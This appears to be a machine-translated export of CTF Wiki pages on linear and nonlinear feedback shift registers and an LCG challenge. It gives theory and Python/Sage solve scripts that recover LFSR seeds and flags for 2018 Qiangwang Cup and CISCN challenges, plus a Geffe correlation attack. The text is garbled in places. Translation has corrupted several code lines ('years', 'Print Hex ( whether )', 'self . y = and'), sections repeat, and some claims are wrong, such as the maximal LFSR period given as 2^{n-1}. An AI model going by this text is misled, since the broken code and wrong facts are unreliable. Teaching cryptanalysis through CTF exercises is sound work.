A(x)=\\frac{p(x)}{\\overline f(x)} Where p(x)=\\sum\\limits_{i=1}^{n}(c_{ni}x^{ni}\\sum\\limits_{j=1}^{i}a_jx^{j-1 }) p(x)=\\sum\\limits_{i=1}^{n}(c_{ni}x^{ni}\\sum\\limits_{j=1}^{i}a_jx^{j-1 }) . It can be seen that p(x) is completely determined by the initial state and the coefficient of the feedback function. Sequence cycle and generation function \u00b6 The period of the sequence is the period of the denominator of the resulting true fraction of the function. For n-level linear feedback shift registers, the longest period is 2^{n-1} 2^{n-1} (excluding all zeros). The sequence that reaches the longest period is generally referred to as the m sequence. Special nature \u00b6 The two sequences are accumulated to give a new sequence whose period is the sum of the periods of the two sequences. The sequence is an n-level m sequence if and only if the minimal polynomial of the sequence is n primitive polynomials. BM algorithm \u00b6 In general, we can consider LFSR from two perspectives. Key generation angle. Generally, we want to use a LFSR with as low a level as possible to generate a sequence with a large period and good randomness. Cryptographic analysis, given a sequence a of length n, how to construct a LFSR with as few stages as possible to generate it. In fact, this is the source of the BM algorithm. In general, we define the linear complexity of a sequence as follows If s is an all-zero sequence, the linear complexity is zero. If no LFSR can generate s, the linear complexity is infinite. Otherwise, the linear complexity of s is the minimum level of LFSR that generates L(s). The requirements of the BM algorithm we need to know the sequence of length 2n. Complexity Time complexity: O(n^2) sub-bit operation Space complexity: O(n) bits. Details about the BM algorithm, added later, are currently in the learning process. But in fact, if we know the sequence of length 2n, we can also get a stupid way to get the original sequence. Let's assume that the known sequence is a_1,...,a_{2n} a_1,...,a_{2n} , we can make S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) Then we can construct the matrix X=(S_1,...,S_n) X=(S_1,...,S_n) , then S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X and so (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} Then we also know the feedback expression of the LFSR, and then we can introduce the initialization seed. 2018 \u5f3a\u7f51\u676fstreamgame1 \u00b6 Simply look at the topic from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () It can be found that the length of the flag is 25-5-1=19, so it can be violently enumerated. result \u279c 2018 -Strong Net Cup-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 Therefore flag is flag{1110101100001101011}. 2018 CISCN preliminary match oldstreamgame \u00b6 Simply look at the topic flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () The program is very simple, it is still an LFSR, but the initial state is 32 bits. Of course, we can also choose to blast, but here we do not choose blasting. Here are two approaches. In the first method, the 32th bit of the program output is determined by the first 31 bits of the program output and the first bit of the initial seed, so we can know the first bit of the initial seed, and then we can know the initial seed. The second bit, and so on. code show as below mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = & quot ; & quot ; key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + years idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] Surely = int ( ans , 2 ) Print Hex ( whether ) run \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 In the second approach, we can consider the process of matrix conversion. If 32 linear transformations are performed, the first 32 bits of the output stream can be obtained. In fact, we only need the first 32 bits to restore the initial state. mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank ( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) Print Hex ( whether ) Running script \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 Thus flag is flag{926201d7}. Another way is for TokyoWesterns, you can refer to the corresponding folder file. topic \u00b6 references \u00b6 Cryptography handouts, edited by Li Chao, Qu Longjiang","title":"Linear Feedback Shift Register"},{"location":"crypto/streamcipher/fsr/lfsr/#linear-feedback-shift-register-lfsr","text":"","title":"Linear Feedback Shift Register - LFSR"},{"location":"crypto/streamcipher/fsr/lfsr/#introduction","text":"The feedback function of the linear feedback shift register is generally as follows a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} Where c_j c_j is in a finite field F_q F_q . Since the linear space is a linear transformation, we can know that this linear transformation is \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] Furthermore, we can find the characteristic polynomial as $ f (x) = x ^ n- sum limit_ {i = 1} ^ {n} c_ix ^ {in} $ At the same time, we define its reciprocal polynomial as \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} We also call the reciprocal polynomial as the joint polynomial of the linear feedback shift register. Here are some theorems that we need to remember. Interesting can be derived by ourselves.","title":"Introduction"},{"location":"crypto/streamcipher/fsr/lfsr/#characteristic-polynomial-and-generator","text":"Knowing the characteristic polynomial of an n-level linear feedback shift register, then the corresponding generation function of the sequence is A(x)=\\frac{p(x)}{\\overline f(x)} A(x)=\\frac{p(x)}{\\overline f(x)} Where p(x)=\\sum\\limits_{i=1}^{n}(c_{ni}x^{ni}\\sum\\limits_{j=1}^{i}a_jx^{j-1 }) p(x)=\\sum\\limits_{i=1}^{n}(c_{ni}x^{ni}\\sum\\limits_{j=1}^{i}a_jx^{j-1 }) . It can be seen that p(x) is completely determined by the initial state and the coefficient of the feedback function.","title":"Characteristic Polynomial and Generator"},{"location":"crypto/streamcipher/fsr/lfsr/#sequence-cycle-and-generation-function","text":"The period of the sequence is the period of the denominator of the resulting true fraction of the function. For n-level linear feedback shift registers, the longest period is 2^{n-1} 2^{n-1} (excluding all zeros). The sequence that reaches the longest period is generally referred to as the m sequence.","title":"Sequence cycle and generation function"},{"location":"crypto/streamcipher/fsr/lfsr/#special-nature","text":"The two sequences are accumulated to give a new sequence whose period is the sum of the periods of the two sequences. The sequence is an n-level m sequence if and only if the minimal polynomial of the sequence is n primitive polynomials.","title":"Special nature"},{"location":"crypto/streamcipher/fsr/lfsr/#bm-algorithm","text":"In general, we can consider LFSR from two perspectives. Key generation angle. Generally, we want to use a LFSR with as low a level as possible to generate a sequence with a large period and good randomness. Cryptographic analysis, given a sequence a of length n, how to construct a LFSR with as few stages as possible to generate it. In fact, this is the source of the BM algorithm. In general, we define the linear complexity of a sequence as follows If s is an all-zero sequence, the linear complexity is zero. If no LFSR can generate s, the linear complexity is infinite. Otherwise, the linear complexity of s is the minimum level of LFSR that generates L(s). The requirements of the BM algorithm we need to know the sequence of length 2n. Complexity Time complexity: O(n^2) sub-bit operation Space complexity: O(n) bits. Details about the BM algorithm, added later, are currently in the learning process. But in fact, if we know the sequence of length 2n, we can also get a stupid way to get the original sequence. Let's assume that the known sequence is a_1,...,a_{2n} a_1,...,a_{2n} , we can make S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) Then we can construct the matrix X=(S_1,...,S_n) X=(S_1,...,S_n) , then S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X and so (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} Then we also know the feedback expression of the LFSR, and then we can introduce the initialization seed.","title":"BM algorithm"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-streamgame1","text":"Simply look at the topic from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () It can be found that the length of the flag is 25-5-1=19, so it can be violently enumerated. result \u279c 2018 -Strong Net Cup-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 Therefore flag is flag{1110101100001101011}.","title":"2018 \u5f3a\u7f51\u676fstreamgame1"},{"location":"crypto/streamcipher/fsr/lfsr/#2018-ciscn-preliminary-match-oldstreamgame","text":"Simply look at the topic flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () The program is very simple, it is still an LFSR, but the initial state is 32 bits. Of course, we can also choose to blast, but here we do not choose blasting. Here are two approaches. In the first method, the 32th bit of the program output is determined by the first 31 bits of the program output and the first bit of the initial seed, so we can know the first bit of the initial seed, and then we can know the initial seed. The second bit, and so on. code show as below mask = 0b10100100000010000000100010010100 b = '' N = 32 with open ( 'key' , 'rb' ) as f : b = f . read () key = '' for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): key += str ( t >> j & 1 ) idx = 0 ans = & quot ; & quot ; key = key [ 31 ] + key [: 32 ] while idx < 32 : tmp = 0 for i in range ( 32 ): if mask >> i & 1 : tmp ^= int ( key [ 31 - i ]) ans = str ( tmp ) + years idx += 1 key = key [ 31 ] + str ( tmp ) + key [ 1 : 31 ] Surely = int ( ans , 2 ) Print Hex ( whether ) run \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 python exp1.py 0x926201d7 In the second approach, we can consider the process of matrix conversion. If 32 linear transformations are performed, the first 32 bits of the output stream can be obtained. In fact, we only need the first 32 bits to restore the initial state. mask = 0b10100100000010000000100010010100 N = 32 F = GF ( 2 ) b = '' with open ( 'key' , 'rb' ) as f : b = f . read () R = [ vector ( F , N ) for i in range ( N )] for i in range ( N ): R [ i ][ N - 1 ] = mask >> ( 31 - i ) & 1 for i in range ( N - 1 ): R [ i + 1 ][ i ] = 1 M = Matrix ( F , R ) M = M ^ N vec = vector ( F , N ) row = 0 for i in range ( N / 8 ): t = ord ( b [ i ]) for j in xrange ( 7 , - 1 , - 1 ): vec [ row ] = t >> j & 1 row += 1 print rank ( M ) num = int ( '' . join ( map ( str , list ( M . solve_left ( vec )))), 2 ) Print Hex ( whether ) Running script \u279c 2018 -CISCN-start-oldstreamgame git: ( master ) \u2717 sage exp.sage 32 0x926201d7 Thus flag is flag{926201d7}. Another way is for TokyoWesterns, you can refer to the corresponding folder file.","title":"2018 CISCN preliminary match oldstreamgame"},{"location":"crypto/streamcipher/fsr/lfsr/#topic","text":"","title":"topic"},{"location":"crypto/streamcipher/fsr/lfsr/#references","text":"Cryptography handouts, edited by Li Chao, Qu Longjiang","title":"references"},{"location":"crypto/streamcipher/fsr/nfsr/","text":"\u975e\u53cd\u9988 feedback shift register \u00b6 Introduction \u00b6 In order to make the sequence of key stream output as complex as possible, a nonlinear feedback shift register is used. There are three common types. Nonlinear combination generator that uses a nonlinear combination function for the output of multiple LFSRs Nonlinear filter generator that uses a nonlinear combination function for the contents of an LFSR Clock generator that uses the output of one (or more) LFSRs to control the clock of another (or multiple) LFSRs Nonlinear Combination Generator \u00b6 Introduction \u00b6 The combination generator is generally shown below. Geffe \u00b6 Here we take Geffe as an example. Geffe contains 3 linear feedback shift registers, and the nonlinear combination function is F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 2018 Strong Net Cup streamgame3 \u00b6 Simply look at the topic from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 ) [ 2 :]) == 17 assert len ( bin ( R2 ) [ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = & quot ; & quot ; for i in range ( 1024 ): tmp1kb = & quot ; & quot ; for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb + = tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () It can be seen that the program is very similar to the Geffe generator. Here we use the related attack method to attack. We can count the output of the last class Geffe generator when the three LFSR outputs are different, as follows. | x_1 x_1 | x_2 x_2 | x_3 x_3 | F(x_1,x_2,x_3) F(x_1,x_2,x_3) | | ----- | ----- | ----- | ---------------- | | 0 | 0 | 0 | 0 | | 0 | 0 | 1 | 1 | | 0 | 1 | 0 | 0 | | 0 | 1 | 1 | 0 | | 1 | 0 | 0 | 0 | | 1 | 0 | 1 | 1 | | 1 | 1 | 0 | 1 | | 1 | 1 | 1 | 1 | it can be discovered Geffe's output has the same probability as x_1 x_1 0.75 Geffe's output has the same probability of x_2 x_2 as 0.5 Geffe's output has the same probability of x_3 x_3 as 0.75 This shows that the output is very relevant to the first and third. Therefore, we can violently enumerate the output of the first and third LFSRs to determine the number equal to the output of Geffe-like, and if it is about 75%, it can be considered correct. The second is a direct violent enumeration. The script is as follows #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 true = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) The results are as follows \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 years old: 1b9cb 5979c 16b2f3 Thus flag is flag{01b9cb05979c16b2f3}. topic \u00b6 2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip Reference \u00b6 https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"Nonlinear Feedback Shift Register"},{"location":"crypto/streamcipher/fsr/nfsr/#feedback-shift-register","text":"","title":"\u975e\u53cd\u9988 feedback shift register"},{"location":"crypto/streamcipher/fsr/nfsr/#introduction","text":"In order to make the sequence of key stream output as complex as possible, a nonlinear feedback shift register is used. There are three common types. Nonlinear combination generator that uses a nonlinear combination function for the output of multiple LFSRs Nonlinear filter generator that uses a nonlinear combination function for the contents of an LFSR Clock generator that uses the output of one (or more) LFSRs to control the clock of another (or multiple) LFSRs","title":"Introduction"},{"location":"crypto/streamcipher/fsr/nfsr/#nonlinear-combination-generator","text":"","title":"Nonlinear Combination Generator"},{"location":"crypto/streamcipher/fsr/nfsr/#introduction_1","text":"The combination generator is generally shown below.","title":"Introduction"},{"location":"crypto/streamcipher/fsr/nfsr/#geffe","text":"Here we take Geffe as an example. Geffe contains 3 linear feedback shift registers, and the nonlinear combination function is F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3 F(x_1,x_2,x_3)=(x_1 \\and x_2) \\oplus (\\urcorner x_1 \\and x_3)=(x_1 \\and x_2) \\oplus ( x_1 \\and x_3)\\oplus x_3","title":"Geffe"},{"location":"crypto/streamcipher/fsr/nfsr/#2018-strong-net-cup-streamgame3","text":"Simply look at the topic from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 24 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW ,( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1 = int ( flag [ 5 : 11 ], 16 ) R2 = int ( flag [ 11 : 17 ], 16 ) R3 = int ( flag [ 17 : 23 ], 16 ) assert len ( bin ( R1 ) [ 2 :]) == 17 assert len ( bin ( R2 ) [ 2 :]) == 19 assert len ( bin ( R3 )[ 2 :]) == 21 R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 for fi in range ( 1024 ): print fi tmp1mb = & quot ; & quot ; for i in range ( 1024 ): tmp1kb = & quot ; & quot ; for j in range ( 1024 ): tmp = 0 for k in range ( 8 ): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) tmp = ( tmp << 1 ) ^ out tmp1kb += chr ( tmp ) tmp1mb + = tmp1kb f = open ( \"./output/\" + str ( fi ), \"ab\" ) f . write ( tmp1mb ) f . close () It can be seen that the program is very similar to the Geffe generator. Here we use the related attack method to attack. We can count the output of the last class Geffe generator when the three LFSR outputs are different, as follows. | x_1 x_1 | x_2 x_2 | x_3 x_3 | F(x_1,x_2,x_3) F(x_1,x_2,x_3) | | ----- | ----- | ----- | ---------------- | | 0 | 0 | 0 | 0 | | 0 | 0 | 1 | 1 | | 0 | 1 | 0 | 0 | | 0 | 1 | 1 | 0 | | 1 | 0 | 0 | 0 | | 1 | 0 | 1 | 1 | | 1 | 1 | 0 | 1 | | 1 | 1 | 1 | 1 | it can be discovered Geffe's output has the same probability as x_1 x_1 0.75 Geffe's output has the same probability of x_2 x_2 as 0.5 Geffe's output has the same probability of x_3 x_3 as 0.75 This shows that the output is very relevant to the first and third. Therefore, we can violently enumerate the output of the first and third LFSRs to determine the number equal to the output of Geffe-like, and if it is about 75%, it can be considered correct. The second is a direct violent enumeration. The script is as follows #for x1 in range(2): # for x2 in range(2): # for x3 in range(2): # print x1,x2,x3,(x1*x2)^((x2^1)*x3) #n = [17,19,21] #cycle = 1 #for i in n: # cycle = cycle*(pow(2,i)-1) #print cycle def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) def single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ): ( R1_NEW , x1 ) = lfsr ( R1 , R1_mask ) ( R2_NEW , x2 ) = lfsr ( R2 , R2_mask ) ( R3_NEW , x3 ) = lfsr ( R3 , R3_mask ) return ( R1_NEW , R2_NEW , R3_NEW , ( x1 * x2 ) ^ (( x2 ^ 1 ) * x3 )) R1_mask = 0x10020 R2_mask = 0x4100c R3_mask = 0x100002 n3 = 21 n2 = 19 n1 = 17 def guess ( beg , end , num , mask ): ansn = range ( beg , end ) data = open ( './output/0' ) . read ( num ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) now = 0 true = 0 for i in ansn : r = i cnt = 0 for j in range ( num * 8 ): r , lastbit = lfsr ( r , mask ) lastbit = str ( lastbit ) cnt += ( lastbit == data [ j ]) if cnt > now : now = cnt res = i print now , res return res def bruteforce2 ( x , z ): data = open ( './output/0' ) . read ( 50 ) data = '' . join ( bin ( 256 + ord ( c ))[ 3 :] for c in data ) for y in range ( pow ( 2 , n2 - 1 ), pow ( 2 , n2 )): R1 , R2 , R3 = x , y , z flag = True for i in range ( len ( data )): ( R1 , R2 , R3 , out ) = single_round ( R1 , R1_mask , R2 , R2_mask , R3 , R3_mask ) if str ( out ) != data [ i ]: flag = False break if y % 10000 == 0 : print 'now: ' , x , y , z if flag : print 'ans: ' , hex ( x )[ 2 :], hex ( y )[ 2 :], hex ( z )[ 2 :] break R1 = guess ( pow ( 2 , n1 - 1 ), pow ( 2 , n1 ), 40 , R1_mask ) print R1 R3 = guess ( pow ( 2 , n3 - 1 ), pow ( 2 , n3 ), 40 , R3_mask ) print R3 R1 = 113099 R3 = 1487603 bruteforce2 ( R1 , R3 ) The results are as follows \u279c 2018 -CISCN-start-streamgame3 git: ( master ) \u2717 python exp.py 161 65536 172 65538 189 65545 203 65661 210 109191 242 113099 113099 157 1048576 165 1048578 183 1048580 184 1049136 186 1049436 187 1049964 189 1050869 190 1051389 192 1051836 194 1053573 195 1055799 203 1060961 205 1195773 212 1226461 213 1317459 219 1481465 239 1487603 1487603 now: 113099 270000 1487603 now: 113099 280000 1487603 now: 113099 290000 1487603 now: 113099 300000 1487603 now: 113099 310000 1487603 now: 113099 320000 1487603 now: 113099 330000 1487603 now: 113099 340000 1487603 now: 113099 350000 1487603 now: 113099 360000 1487603 years old: 1b9cb 5979c 16b2f3 Thus flag is flag{01b9cb05979c16b2f3}.","title":"2018 Strong Net Cup streamgame3"},{"location":"crypto/streamcipher/fsr/nfsr/#topic","text":"2017 WHCTF Bornpig 2018 Google CTF 2018 Betterzip","title":"topic"},{"location":"crypto/streamcipher/fsr/nfsr/#reference","text":"https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf","title":"Reference"},{"location":"crypto/streamcipher/lcg/challenge/","text":"\u9898 \u00b6 2016 Google CTF woodman \u00b6 The approximate meaning of the program is a guessing game. If you guess a number of times in a row, even if you get the flag, the core code behind the corresponding number is as follows: class SecurePrng ( object ): def __init__ ( self ): # generate seed with 64 bits of entropy self . p = 4646704883 L self . x = random . randint ( 0 , self . p ) self . y = random . randint ( 0 , self . p ) def next ( self ): self . x = ( 2 * self . x + 3 ) % self . p self . y = ( 3 * self . y + 9 ) % self . p return ( self . x ^ self . y ) Here we obviously, we guessed that the first two rounds are still relatively easy, after all, the probability is also 0.25. Here, after we guessed the first two rounds, we used Z3 to solve the initial x and y, then we can easily guess the remaining values. The specific script is as follows, but Z3 seems to be problematic when solving such problems. . . Here we consider another method, ** sequentially extracting the value of x from the low-bit enumeration to the high-bit bit. The reason for this is that it depends on such observation. a + b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because the i-th bit is operated, only the carry value of the low bit may be received. a - b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because the i-th bit is operated, there is only a possible borrow from the low bit. a * b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple additions. a % b = c, the value of the ith bit of c is only affected by the a and b bits and lower bits. Because this can be seen as multiple subtractions. a ^ b = c, the value of the ith bit of c is only affected by the bits a and b. This is obvious. Note: Personally feel this technique is very useful. In addition, it is not difficult to know that the bit of p is 33 bits. The specific use ideas are as follows First get the value you guessed twice, this probability is 0.25. In turn, enumerate the corresponding bits of x after the first iteration from the low bit to the high bit. Calculate the second value according to the value of the enumeration. Only when the corresponding bit is correct, you can add it to the candidate correct value. It should be noted that due to the modulo, we need to reduce the number of enumerations in the end. In addition, in the final judgment, it is still necessary to ensure that the corresponding value meets certain requirements, because the number of reductions has been enumerated before. The specific use code is as follows import import random from itertools import product class SecurePrng ( object ): def __init__ ( self , x =- 1 , y =- 1 ): # generate seed with 64 bits of entropy self . p = 4646704883 L # 33bit if x == - 1 : self . x = random . randint ( 0 , self . p ) else : self . x = x if y == - 1 : self . y = random . randint ( 0 , self . p ) else : self . y = and def next ( self ): self . x = ( 2 